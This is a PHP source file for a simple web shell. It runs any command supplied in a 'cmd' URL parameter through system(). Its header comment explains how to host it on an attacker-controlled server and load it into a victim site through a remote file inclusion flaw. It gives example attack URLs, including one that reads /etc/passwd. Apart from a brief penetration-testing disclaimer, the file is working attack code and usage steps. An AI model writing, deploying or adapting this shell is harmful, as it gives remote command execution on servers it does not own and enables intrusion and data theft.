<?php
/**
 * Simple PHP Web Shell
 *
 * This script allows basic command execution on a web server via a GET request.
 * It's intended for penetration testing purposes only and should NEVER be
 * deployed in a production environment due to severe security risks.
 *
 * Usage:
 * 1. Host this file (e.g., as shell.php) on your attacker-controlled web server.
 * 2. Exploit an RFI vulnerability on the target to include this file.
 * 3. Execute commands by appending "?cmd=<your_command>" to the URL
 * of the included webshell.
 *
 * Example RFI Payload (assuming your webshell is at http://attacker.com/shell.php):
 * http://vulnerable-target.com/index.php?page=http://attacker.com/shell.php
 *
 * Example Command Execution (after successful RFI):
 * http://vulnerable-target.com/index.php?page=http://attacker.com/shell.php?cmd=ls%20-la
 * http://vulnerable-target.com/index.php?page=http://attacker.com/shell.php?cmd=cat%20/etc/passwd
 */

// Check if the 'cmd' GET parameter is set
if (isset($_GET['cmd'])) {
    // Get the command from the 'cmd' parameter
    $command = $_GET['cmd'];

    // Output a header to indicate the start of command output
    echo "<pre>--- Command Output Start ---\n";

    // Execute the command using system() and print the output
    // system() is used here for simplicity as it directly outputs the command result.
    // Alternatives include exec(), shell_exec(), passthru().
    system($command);

    // Output a footer
    echo "\n--- Command Output End ---</pre>";
} else {
    // If no command is provided, display a usage message
    echo "<pre>Simple PHP Web Shell\n";
    echo "Usage: Add ?cmd=<your_command> to the URL.\n";
    echo "Example: ?cmd=ls%20-la</pre>";
}
?>
